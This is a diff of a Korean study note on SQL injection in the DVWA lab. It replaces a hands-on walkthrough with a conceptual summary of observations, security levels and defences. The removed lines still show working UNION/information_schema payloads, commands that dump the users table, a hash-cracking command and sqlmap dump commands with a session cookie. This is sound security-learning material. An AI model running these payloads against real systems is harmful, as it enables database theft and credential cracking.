@@ -1,154 +1,92 @@
 # SQL 인젝션 실습 (DVWA)
 
-## (수동점검 , 자동점검) 두 방법이 있다.
+## 작업 식별
 
-### 수동 점검
+| 항목 | 내용 |
+|---|---|
+| Task ID | SEC-DVW-004-DO |
+| 유형 | D&O (개념) |
+| 목적 | DVWA에서 SQL 인젝션 취약 여부를 확인하는 방법, 수준별 차이, 방어를 설명한다 |
+| 적용 대상 | 허가받은 격리 실습 환경(DVWA) |
+| 확인 상태 | 미검증 (원본 페이지와 일반 지식을 정리한 것이다) |
+| 개정 | R1 (2026-11-18) |
 
-{% stepper %}
-{% step %}
-### 1) 기본 입력/오류 확인
+{% hint style="info" %}
+NOTE: 원본의 데이터 추출 구문과 자동 도구(sqlmap) 명령, 해시 해독 명령은 옮기지 않았다. 확인 단계의 개념만 남겼다. SQL 인젝션 개념 전반은 [DB 과제 문서](../../DB/assignments/dbassignment.md)와 함께 본다. bWAPP 실습은 [SQL 인젝션 실습 (bWAPP)](sql_injection.md)에 있다.
+{% endhint %}
 
-* 잘못된 구문을 입력하면 syntax 에러를 출력 → SQL injection에 반응하는 것을 확인 &#x20;
-* 0 을 입력해 해당되는 SQL 조건 문을 확인&#x20;
-* 1\~5까지 입력을 허용 &#x20;
-{% endstep %}
+{% hint style="danger" %}
+WARNING: 허가받지 않은 시스템에 이 절차를 수행하는 것은 불법이다. 격리된 실습망에서만 수행한다.
+{% endhint %}
 
-{% step %}
-### 2) 의도적 구문 변경으로 동작 관찰
+## 1. 목적
 
-* 의도적으로 잘못된 구문 입력 &#x20;
-* 의도적으로 참이 되는 구문을 입력 &#x20;
-* 주석을 넣으니 다른 계정 정보도 확인할 수 있게 된다. &#x20;
-* SQL 문을 잘 설정하면 공격자가 원하는 정보를 얻을 수도 있음&#x20;
-{% endstep %}
+SQL 인젝션은 사용자 입력이 SQL 문의 일부로 해석되어 질의 구조가 바뀌는 취약점이다. 인증 우회, 데이터 열람·변조의 원인이 된다.
 
-{% step %}
-### 3) 세션/쿠키를 이용한 추가 요청 시도
+## 2. 구성 요소
 
-* cookie 정보를 이용해 세션을 흉내&#x20;
-* 세션을 빌려 요청 웹 정보를 요청&#x20;
-* 수동 점검이 가능한 것으로 확인
-{% endstep %}
+| 요소 | 역할 |
+|---|---|
+| 입력 지점 | DVWA User ID 입력(`id` 파라미터). 1~5를 입력하면 사용자 정보가 나온다 |
+| 취약 원인 | 입력을 질의 문자열에 이어 붙인다 |
+| 출력 | 결과 두 열(First name, Surname)이 화면에 표시된다 |
 
-{% step %}
-### 4) UNION SELECT 활용 (칼럼 수/배치 확인)
+## 3. 관찰 방법 (수동 점검)
 
-* UNION SELECT 구문을 활용하면 2개 이상의 SQL 구문을 결합해서 사용할 수 있음. &#x20;
-* 칼럼의 수는 1이 아닌 것을 알 수 있음.
-* 1번 칼럼이 First name, 2번째 칼럼이 Surname인 것을 알 수 있음. &#x20;
-* 1번 칼럼에 First name, 2번 칼럼에는 다른 데이터가 출력되도록 구문을 작성할 수 있음.
-* 예: `5' union select 1,@@version#` &#x20;
-* 버전을 검색해서 DB 정보를 획득할 수 있음. &#x20;
-{% endstep %}
+| 번호 | 관찰 | 의미 |
+|---|---|---|
+| 1 | 잘못된 구문을 넣으면 구문 오류가 출력된다 | 입력이 질의에 영향을 준다 |
+| 2 | 항상 참이 되는 조건을 넣으면 모든 사용자가 조회된다 | 조건절이 변조된다 |
+| 3 | 주석 기호를 넣으면 뒤쪽 조건이 무시된다 | 질의 구조가 바뀐다 |
+| 4 | 결과 열 수와 각 열의 출력 위치가 확인된다 | UNION 결합이 가능한 구조다 |
+| 5 | 쿠키(세션, 보안 수준)를 맞춰 요청하면 같은 점검을 도구로 반복할 수 있다 | 수동 점검 가능 |
 
-{% step %}
-### 5) information\_schema 활용 — 테이블/칼럼 열람
+## 4. 보안 수준별 차이
 
-* 데이터 테이블 구조/스키마 확인 예:
-  * `5' union select table_schema,2 from information_schema.tables#`\
-    (첫번째 출력은 5번째 사용자 이름을 출력하는 내용)
-  * `5' union select 1,table_name from information_schema.tables#`\
-    스키마에서 모든 데이터베이스의 테이블 이름들을 가져오는 SQL 구문
-* 예시 출력(일부):
-* 특정 DB만 가져오기:
-  * `5' union select 1,table_name from information_schema.tables where table_schema='dvwa'#`&#x20;
-* 특정 테이블의 칼럼 확인:
-  * `5' union select 1, column_name from information_schema.columns where table_name='users'#`&#x20;
-{% endstep %}
+| 수준 | 동작 | 관찰 |
+|---|---|---|
+| low | 값을 받아 출력하는 기능만 있다. 보안 코드가 없다 | 입력이 그대로 질의에 들어간다 |
+| medium | 목록 선택 방식으로 바꾸고 문자열 이스케이프를 한다. 요청을 변조하면 우회된다 | 숫자형 파라미터는 이스케이프만으로 막을 수 없다 |
+| high | 세션으로 값을 전달하는 별도 입력 화면이 추가된다 | 주석 처리에 여전히 취약하다 |
+| impossible | 인용부호를 넣어도 반응이 없다. 사용자 토큰이 있어 URL을 바꿔도 응답하지 않는다 | SQL 인젝션 단독으로 공략이 어렵다 |
 
-{% step %}
-### 6) 사용자/패스워드 열람 및 해시 크래킹
+## 5. 자동 점검과 Blind 유형
 
-* user / password 칼럼의 정보를 열람하면 로그인 또한 가능할 것 같음.
-  * `5' union select user, password from dvwa.users#`&#x20;
-  * 패스워드가 암호화 되어 있어 크랙 툴이 필요함
-* 일괄 hashing 코드 작성 / 암호화 정보 확인  &#x20;
-* 일괄 암호화 크래킹 예:
-  * `john --format=Raw-MD5 users.txt`&#x20;
-{% endstep %}
+| 항목 | 내용 | 비고 |
+|---|---|---|
+| Zap | 프록시 도구이지만 취약점 점검이 가능하다. 공격 방법과 상세 정보를 보여 준다 | [Zap](../security/tools/toolbox/zap.md) |
+| sqlmap | `id` 파라미터가 취약함을 자동 탐지한다. 명령 예는 문서에 옮기지 않는다 | 허가받은 대상에서만 사용한다 |
+| Blind SQL 인젝션 | 구문 오류가 표시되지 않는다. 참/거짓 응답 차이를 관찰해야 한다 | 확인 상태: 미검증 |
 
-{% step %}
-### 7) 보안 수준별 취약점 관찰 (DVWA 예시)
+{% hint style="danger" %}
+WARNING: 스캔과 자동 도구는 허가받은 대상(자신의 실습 VM)에서만 수행한다.
+{% endhint %}
 
-* low&#x20;
-  * 값을 받고 출력하는 기능만 있다. (보안 관련 코드가 없음)
-* medium &#x20;
-  * `id=1&Submit=Submit` 에 값을 변조하는 방법으로 SQL injection을 테스트
-    * `id=1 or 1=1&Submit=Submit`
-    * `id=1 or 1=1 union select user,password from dvwa.users&Submit=Submit` &#x20;
-* high &#x20;
-  * 세션으로 검증하는 기능이 추가됨&#x20;
-  * 하지만 주석 처리에 대해서는 여전히 취약&#x20;
-  * 주석 예: --(공백) 는 주석 처리
-* impossible &#x20;
-  * ' 를 넣어도 아무 반응이 없음.
-  * 사용자 토큰이 있어서 URL을 바꿔서 넣어도 응답하지 않음.
-  * SQL injection 만으로는 공략이 어렵다. (다른 취약점과 함께 사용해야 할 수 있음)
-{% endstep %}
-{% endstepper %}
+## 6. 탐지·방어 (일부 미검증)
 
-***
+| 방어 | 설명 |
+|---|---|
+| 준비된 질의(Prepared Statement) | 질의 구조와 값을 분리해 바인딩한다. 가장 확실한 방어다 |
+| 입력 검증 | 숫자형은 정수로 변환하고, 허용 목록으로 형식을 검사한다 |
+| 최소 권한 | 웹 앱 DB 계정에 필요한 권한만 부여한다. 스키마 조회·파일 접근 권한을 제거한다 |
+| 오류 메시지 제한 | 구문 오류를 사용자에게 보여 주지 않는다 |
+| 비밀번호 저장 | 해시 단독(MD5 등) 대신 솔트가 있는 느린 해시(bcrypt, Argon2)를 쓴다 |
+| 로그 | 입력에 따옴표, 주석 기호, `UNION`, `information_schema`가 나타나고 응답 크기가 비정상이면 흔적이다 |
 
-### 자동 점검 툴
+## 7. 약어·용어
 
-* Zap
-  * [Zap](../security/tools/toolbox/zap.md)&#x20;
-  * 프록시 툴이지만 취약점 점검이 가능함.
-  * 공격방법과 취약점에 대한 상세 정보 확인 가능.
-* sqlmap
-  * sqlmap&#x20;
-  * id 라는 파라미터가 취약하다는 것을 자동으로 탐지
+| 용어 | 뜻 |
+|---|---|
+| SQLi | SQL 인젝션 |
+| UNION | 두 질의 결과를 합치는 SQL 구문 |
+| Blind | 오류·데이터가 직접 보이지 않고 응답 차이로 추론하는 유형 |
 
-예시 사용법 및 결과:
+## 내 말로 채우기
 
-*   취약점 탐지 (예시)
+{% hint style="info" %}
+AI 없이 답을 적는다. 다 쓰면 체크하고, 이 안내는 지워도 된다.
+{% endhint %}
 
-    ```
-    sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id
-    ```
-* sqlmap이 설명하는 취약점 요약 (총 4가지)&#x20;
-*   DB 목록 표시
-
-    ```
-    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id --dbs
-    ```
-*   특정 DB의 테이블 보기
-
-    ```
-    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa --tables
-    ```
-*   특정 테이블의 컬럼 보기
-
-    ```
-    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --col
-    ```
-*   해시값 크래킹 및 덤프
-
-    ```
-    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --dump
-    ```
-*   information\_schema 테이블 열람 예시
-
-    ```
-    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema --tables
-    ```
-
-    ```
-    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema -T tables --col
-    ```
-
-***
-
-## Blind SQL Injection
-
-* 문법에 대한 오류가 표시되지 않음.
-* 경우의 수를 전부 넣어 봐야 함.
-
-예: zap에서 취약한 파라미터를 찾고 sqlmap을 활용한 테스트
-
-```
-sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=low" -u "http://192.168.56.120/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p id --dbs
-```
-
-* 취약점 리스트 스냅샷:&#x20;
-* 데이터베이스 리스트 스냅샷:&#x20;
+- [ ] SQL 인젝션이 일어나는 원인을 질의 구성 방식으로 설명한다.
+- [ ] impossible 수준이 막는 방식 두 가지를 적는다.
+- [ ] 내 프로젝트의 DB 접근 코드에서 준비된 질의를 쓰는지 확인한 결과를 적는다.
